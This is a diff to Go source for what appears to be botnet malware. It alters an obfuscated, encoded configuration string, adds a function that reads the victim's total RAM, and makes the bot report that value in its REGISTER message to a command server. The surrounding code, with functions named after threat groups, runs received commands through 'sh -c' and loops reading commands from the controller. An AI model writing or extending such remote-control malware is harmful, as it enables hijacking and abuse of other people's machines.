@@ -36,7 +36,7 @@ import (
 var debugMode = true
 
 // Obfuscated config - multi-layer encoding (setup.py generates this)
-const gothTits = "d3mVErbVNRsfff1Q/+twaQgBcQNODMUbks24bq/LbU4BUr" //change me run setup.py
+const gothTits = "d3mVEFASkzds12Q/+twaQgBcQNODMUbks24bq/LbU4BUr" //change me run setup.py
 const cryptSeed = "7b32e8e1"                                        //change me run setup.py
 
 // DNS servers for TXT record lookups (shuffled for load balancing)
@@ -616,6 +616,15 @@ func charmingKitten() string {
 	return osName + "-" + goarch
 }
 
+// revilMem returns total system RAM in MB
+func revilMem() int64 {
+	var info syscall.Sysinfo_t
+	if err := syscall.Sysinfo(&info); err != nil {
+		return 0
+	}
+	return int64(info.Totalram * uint64(info.Unit) / 1024 / 1024)
+}
+
 // ExecuteShell => sidewinder
 func sidewinder(cmd string) (string, error) {
 	args := []string{"sh", "-c", cmd}
@@ -958,7 +967,8 @@ func anonymousSudan(conn net.Conn) {
 	}
 	botID := mustangPanda()
 	arch := charmingKitten()
-	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s\n", protocolVersion, botID, arch)))
+	ram := revilMem()
+	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s:%d\n", protocolVersion, botID, arch, ram)))
 	for {
 		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
 		command, err := reader.ReadString('\n')
